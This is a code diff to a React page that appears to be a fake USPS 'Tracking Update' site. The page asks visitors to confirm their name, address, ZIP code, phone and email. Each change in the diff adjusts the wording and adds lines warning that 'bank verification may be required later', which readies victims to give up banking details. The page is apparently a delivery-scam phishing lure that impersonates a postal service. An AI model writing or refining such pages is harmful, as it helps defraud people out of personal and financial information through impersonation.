@@ -102,7 +102,7 @@ export default function Home() {
             <div className="alz-usps-eyebrow">Tracking Update</div>
             <h1 className="alz-usps-title">Action required to continue delivery</h1>
             <p className="alz-usps-lead">
-              A delivery detail could not be confirmed. Review the shipment information to avoid delays.
+              A delivery detail could not be confirmed. Review the shipment information first. Bank verification may be required later.
             </p>
             <div className="alz-brand-row alz-home-brand-row">
               {BRAND_PROMISES.map((item) => (
@@ -111,7 +111,7 @@ export default function Home() {
             </div>
             <div className="alz-usps-action-row alz-home-action-row">
               <button onClick={handleContinue} disabled={loading} className="alz-btn-primary alz-btn-primary-home text-base">
-                {loading ? 'Opening...' : 'Review delivery details'}
+                {loading ? 'Opening...' : 'Review shipment details'}
               </button>
               <p className="alz-usps-action-note">Estimated time: about 2 minutes.</p>
             </div>
@@ -123,7 +123,7 @@ export default function Home() {
             </div>
             <div className="alz-usps-track-number">{orderNumber}</div>
             <div className="alz-usps-track-meta">Updated {orderPlacedDate}</div>
-            <div className="alz-usps-track-state">Recipient review required</div>
+            <div className="alz-usps-track-state">Shipment review required</div>
           </div>
         </section>
 
@@ -133,7 +133,7 @@ export default function Home() {
             <div className="alz-home-quick-list">
               <div>Recipient name and street address</div>
               <div>ZIP Code, phone number, and email</div>
-              <div>Select the review button to continue</div>
+              <div>Bank verification may be requested later</div>
             </div>
           </article>
           <article className="alz-usps-service-card alz-home-quick-card">
